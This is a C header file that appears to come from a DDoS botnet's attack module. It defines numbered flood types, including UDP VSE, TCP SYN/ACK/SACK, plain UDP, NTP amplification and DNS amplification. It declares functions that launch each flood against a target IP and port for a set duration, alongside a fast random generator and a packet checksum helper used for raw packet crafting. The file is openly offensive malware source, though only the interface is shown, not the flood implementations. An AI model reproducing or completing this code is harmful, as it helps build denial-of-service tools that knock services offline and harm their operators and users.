#ifndef ATTACK_H
#define ATTACK_H

#include <stdint.h>
#include <netinet/in.h>

// Attack Vectors
// Fast PRNG (Xorshift32)
static inline uint32_t fast_rand(void) {
    static uint32_t y = 2463534242;
    y ^= (y << 13);
    y ^= (y >> 17);
    y ^= (y << 5);
    return y;
}

// Optimized Checksum
static inline unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) sum += *(unsigned char *)ptr;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// Attack Vectors
#define ATK_UDP_VSE    1
#define ATK_TCP_SOCKET 2
#define ATK_TCP_SACK   3
#define ATK_UDP_PLAIN  5
#define ATK_TCP_SYN    6
#define ATK_TCP_ACK    7
#define ATK_NTP_AMP    8
#define ATK_DNS_AMP    9

// Prototypes
void attack_init(void);
void attack_start(int type, uint32_t ip, uint16_t port, uint32_t duration);

// Internal Implementations
void attack_udp_vse(uint32_t ip, uint16_t port, uint32_t duration);
void attack_socket(uint32_t ip, uint16_t port, uint32_t duration);
void attack_tcp_sack(uint32_t ip, uint16_t port, uint32_t duration);
void attack_udp_plain(uint32_t ip, uint16_t port, uint32_t duration);
void attack_tcp_syn(uint32_t ip, uint16_t port, uint32_t duration);
void attack_tcp_ack(uint32_t ip, uint16_t port, uint32_t duration);
void attack_ntp(uint32_t ip, uint16_t port, uint32_t duration);
void attack_dns(uint32_t ip, uint16_t port, uint32_t duration);

#endif
